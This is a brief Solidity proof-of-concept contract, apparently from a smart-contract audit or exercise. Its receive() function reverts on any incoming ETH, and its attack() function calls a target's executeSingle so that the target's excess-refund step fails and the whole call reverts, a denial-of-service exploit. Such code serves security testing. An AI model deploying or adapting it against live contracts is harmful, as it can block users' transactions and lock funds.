// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract RejectEther {
    receive() external payable {
        revert("No ETH allowed");
    }

    function attack(address target) external {
        // Call executeSingle (target=this, value=0, data="")
        // This triggers `_refundExcess` because contract has 1.0 ETH balance
        (bool success, ) = target.call(abi.encodeWithSignature("executeSingle(address,uint256,bytes)", address(this), 0, ""));
        require(success, "Attack failed (BatchExecutor reverted)");
    }
}
